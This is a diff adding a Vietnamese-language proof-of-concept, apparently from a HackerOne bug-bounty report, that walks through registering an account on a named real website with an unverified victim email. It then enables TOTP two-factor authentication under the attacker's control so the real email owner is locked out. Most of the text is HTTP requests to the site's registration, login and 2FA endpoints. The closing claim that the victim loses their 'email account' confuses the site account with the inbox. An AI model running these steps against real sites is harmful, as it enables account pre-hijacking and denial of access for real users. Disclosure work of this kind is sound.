@@ -1,0 +1,108 @@
+# https://hackerone.com/reports/3016540
+---
+
+## Chuẩn bị
+
+1. **Email nạn nhân ([victim@example.com](mailto:victim@example.com))** chưa từng đăng ký hoặc chưa được xác minh trên xvideos.com.
+2. **Công cụ**: trình duyệt (hoặc cURL), Burp Suite (hoặc bất kỳ proxy/interceptor nào), ứng dụng Google Authenticator.
+
+---
+
+## Bước 1: Đăng ký tài khoản với email của nạn nhân
+
+1. Mở trình duyệt hoặc Burp và truy cập:
+
+   ```
+   GET https://www.xvideos.com/join
+   ```
+2. Điền form đăng ký:
+
+   * **Username**: attacker123
+   * **Email**: [victim@example.com](mailto:victim@example.com)
+   * **Password**: StrongP\@ssw0rd!
+3. Submit form (POST):
+
+   ```http
+   POST https://www.xvideos.com/account/register
+   Host: www.xvideos.com
+   Content-Type: application/x-www-form-urlencoded
+
+   username=attacker123&
+   email=victim%40example.com&
+   password=StrongP%40ssw0rd%21
+   ```
+4. **Kết quả**: Server chấp nhận tạo tài khoản mà không gửi email xác minh.
+
+---
+
+## Bước 2: Kích hoạt 2FA trên tài khoản nạn nhân
+
+1. Đăng nhập ngay lập tức bằng credentials vừa tạo:
+
+   ```http
+   POST https://www.xvideos.com/account/login
+   username=attacker123
+   password=StrongP%40ssw0rd%21
+   ```
+
+2. Truy cập trang bảo mật:
+
+   ```
+   GET https://www.xvideos.com/account/security
+   ```
+
+3. Gửi yêu cầu bật 2FA (POST):
+
+   ```http
+   POST https://www.xvideos.com/account/security/enable_2fa
+   Content-Type: application/json
+
+   {
+     "method": "totp"
+   }
+   ```
+
+4. Server trả về **secret TOTP** (base32) như:
+
+   ```json
+   {
+     "secret": "JBSWY3DPEHPK3PXP",
+     "qr_code_url": "https://www.xvideos.com/qrcode/…"
+   }
+   ```
+
+5. Mở Google Authenticator, scan `qr_code_url` hoặc nhập thủ công `JBSWY3DPEHPK3PXP`. Lấy mã OTP 6 chữ số.
+
+6. Xác nhận OTP với server:
+
+   ```http
+   POST https://www.xvideos.com/account/security/confirm_2fa
+   Content-Type: application/json
+
+   {
+     "otp": "123456"
+   }
+   ```
+
+7. Nếu đúng, 2FA được bật thành công.
+
+---
+
+## Bước 3: Khóa tài khoản email của nạn nhân
+
+1. Kẻ tấn công **không cần xác minh email**, nhưng nay 2FA đã liên kết với Authenticator của kẻ tấn công.
+
+2. Nạn nhân nếu cố gắng “Quên mật khẩu”:
+
+   ```http
+   POST https://www.xvideos.com/account/forgot_password
+   email=victim%40example.com
+   ```
+
+3. Nạn nhân nhận link reset và đổi mật khẩu thành công, nhưng khi đăng nhập, sẽ bị yêu cầu OTP 2FA – chỉ kẻ tấn công có mã.
+
+4. Kết quả: **Từ chối dịch vụ** đối với chủ sở hữu email – họ không thể truy cập lại tài khoản email (bởi 2FA).
+
+---
+
+
